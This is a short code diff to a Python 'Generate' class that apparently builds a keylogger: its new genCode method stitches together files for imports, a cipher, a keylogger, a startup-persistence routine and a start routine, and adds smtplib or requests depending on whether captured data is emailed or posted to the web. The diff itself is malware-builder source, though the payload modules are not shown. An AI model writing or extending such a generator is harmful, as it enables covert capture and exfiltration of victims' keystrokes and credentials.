@@ -108,6 +108,8 @@ class Generate:
                 3 -> Post to Web
         """
         self.mode = mode
+        self.loaded = False
+        self.final_code = ""
     
     def loadModules(self):
         with open(FileNames._1_imports, "r", encoding='utf-8') as _file:
@@ -137,3 +139,20 @@ class Generate:
         else:
             with open(FileNames._5_file, "r", encoding='utf-8') as _file:
                 self._5_start = _file.read()
+        
+        self.loaded = True
+    
+    def genCode(self):
+        if not self.loaded:
+            self.loadModules()
+        self.final_code = ""
+        self.final_code += self._1_imports
+        if self.mode == 1:
+            self.final_code += '\nimport smtplib\n'
+        elif self.mode == 3:
+            self.final_code += '\nimport requests\n'
+        self.final_code += self._2_cipher
+        self.final_code += self._3_keylogger
+        self.final_code += self._4_startup
+        self.final_code += self._5_start
+        return self.final_code
